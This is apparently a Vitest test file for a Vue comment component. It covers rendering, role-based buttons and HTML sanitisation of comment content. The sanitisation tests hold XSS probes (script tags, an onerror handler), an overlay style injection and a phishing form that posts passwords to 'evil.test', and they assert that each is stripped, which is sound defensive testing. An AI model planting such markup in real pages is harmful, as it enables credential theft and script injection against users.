import { describe, it, expect, vi, beforeEach } from 'vitest'
import { mount } from '@vue/test-utils'
import { setActivePinia, createPinia } from 'pinia'
import CommentItem from './CommentItem.vue'
import type { CommentItem as CommentItemType } from '../../types/comment'
import { useAuthStore } from '../../stores/auth'

vi.mock('vue-router', () => ({
  useRouter: () => ({ push: vi.fn() }),
  useRoute: () => ({ fullPath: '/' }),
}))
vi.mock('../../api/commentService', () => ({
  commentService: { like: vi.fn(), unlike: vi.fn() },
}))

const baseComment: CommentItemType = {
  uuid: 'c1',
  parentUuid: null,
  content: 'hello',
  contentHtml: '<p>hello</p>',
  author: { uuid: 'u1', nickname: 'Alice', avatarUrl: null },
  likeCount: 3,
  liked: false,
  createdAt: new Date().toISOString(),
  editedAt: null,
  deleted: false,
  deletedByRole: null,
}

describe('CommentItem (Stage B)', () => {
  beforeEach(() => setActivePinia(createPinia()))

  it('正常顯示 author + content + likeCount', () => {
    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.text()).toContain('Alice')
    expect(wrapper.find('.content').html()).toContain('hello')
    expect(wrapper.find('[data-testid="comment-like-count"]').text()).toBe('3')
  })

  it('deleted=true → tombstone + 隱藏 author', () => {
    const deleted = { ...baseComment, deleted: true, deletedByRole: 'AUTHOR' as const, author: null }
    const wrapper = mount(CommentItem, { props: { comment: deleted } })
    expect(wrapper.find('.tombstone').text()).toContain('已被作者刪除')
    expect(wrapper.find('.actions').exists()).toBe(false)
  })

  it('editedAt → 顯示 (edited)', () => {
    const edited = { ...baseComment, editedAt: '2026-05-01T10:05:00Z' }
    const wrapper = mount(CommentItem, { props: { comment: edited } })
    expect(wrapper.text()).toContain('(edited)')
  })

  it('replies 巢狀渲染', () => {
    const reply: CommentItemType = { ...baseComment, uuid: 'c2', parentUuid: 'c1' }
    const withReply = { ...baseComment, replies: [reply] }
    const wrapper = mount(CommentItem, { props: { comment: withReply } })
    expect(wrapper.findAll('[data-testid="comment-item"]')).toHaveLength(2)
  })

  it('canEdit / canDelete / canReply 全 true → 顯示 3 個按鈕', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'ADMIN', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.find('[data-testid="comment-edit-btn"]').exists()).toBe(true)
    expect(wrapper.find('[data-testid="comment-delete-btn"]').exists()).toBe(true)
    expect(wrapper.find('[data-testid="comment-reply-btn"]').exists()).toBe(true)
  })

  it('non-owner non-admin → 不顯示 edit/delete', () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'other', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    expect(wrapper.find('[data-testid="comment-edit-btn"]').exists()).toBe(false)
    expect(wrapper.find('[data-testid="comment-delete-btn"]').exists()).toBe(false)
    expect(wrapper.find('[data-testid="comment-reply-btn"]').exists()).toBe(true)  // 已登入可 reply
  })

  it('click reply button → 顯示 reply form; cancel → 隱藏', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    await wrapper.find('[data-testid="comment-reply-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-reply-form"]').exists()).toBe(true)
  })

  it('click edit button → 顯示 edit form 並 prefill content', async () => {
    const auth = useAuthStore()
    auth.user = {
      uuid: 'u1', email: '', nickname: '', avatarUrl: null,
      role: 'USER', emailVerified: true, createdAt: '',
    }
    auth.accessToken = 't'

    const wrapper = mount(CommentItem, { props: { comment: baseComment } })
    await wrapper.find('[data-testid="comment-edit-btn"]').trigger('click')
    expect(wrapper.find('[data-testid="comment-edit-form"]').exists()).toBe(true)
    const textarea = wrapper.find('[data-testid="comment-edit-form"] textarea')
    expect((textarea.element as HTMLTextAreaElement).value).toBe('hello')
  })
})

describe('CommentItem 留言 HTML 消毒（收緊設定）', () => {
  const render = (contentHtml: string) => {
    setActivePinia(createPinia())
    const wrapper = mount(CommentItem, { props: { comment: { ...baseComment, contentHtml } } })
    return wrapper.find('.content').element as HTMLElement
  }

  // 一個 render 只放一個會被移除的節點：happy-dom 的 NodeIterator 在節點被移除後可能略過後續兄弟節點，
  // 組合 payload 另以真實 Chromium 驗證。
  it.each([
    ['內文 <style>', '<p>a</p><style>.ov{position:fixed;inset:0}</style>'],
    ['svg 內 <style>', '<svg><style>.ov{position:fixed;inset:0}</style></svg>'],
  ])('%s 被移除，樣式內容不外洩成文字', (_label, html) => {
    const el = render(html)

    expect(el.querySelectorAll('style').length).toBe(0)
    expect(el.textContent).not.toMatch(/position:\s*fixed/)
  })

  it('style 屬性一律移除，包含偽造的 pre.shiki（Shiki 例外不外洩到留言）', () => {
    const el = render(
      '<p style="position:fixed">a</p><pre class="shiki" style="--shiki-light:#fff"><span style="--shiki-light:#fff">b</span></pre>',
    )

    expect(el.querySelectorAll('[style]').length).toBe(0)
  })

  it('釣魚 form（含 password input 與 button）整個被移除，action 不殘留', () => {
    const el = render(
      '<form action="https://evil.test/steal" method="post"><input type="password"><button>Login</button></form>',
    )

    expect(el.querySelectorAll('form, input, button').length).toBe(0)
    expect(el.querySelectorAll('[action]').length).toBe(0)
  })

  it('iframe 被移除', () => {
    expect(render('<iframe src="about:blank"></iframe>').querySelectorAll('iframe').length).toBe(0)
  })

  it.each([
    ['text', '<input type="text">'],
    ['無 type', '<input>'],
  ])('非 checkbox 的 input（%s）被移除', (_label, html) => {
    expect(render(html).querySelectorAll('input').length).toBe(0)
  })

  it('checkbox 保留', () => {
    const inputs = render('<input type="checkbox" checked>').querySelectorAll('input')

    expect(inputs.length).toBe(1)
    expect(inputs[0].getAttribute('type')).toBe('checkbox')
  })

  it('一般內容不受影響：段落、粗體、連結、script / on* 仍被移除', () => {
    const el = render('<p>hi <strong>bold</strong> <a href="https://example.com">l</a></p><img src="x" onerror="alert(1)"><script>alert(1)</script>')

    expect(el.querySelector('strong')?.textContent).toBe('bold')
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com')
    expect(el.querySelectorAll('script').length).toBe(0)
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false)
  })
})
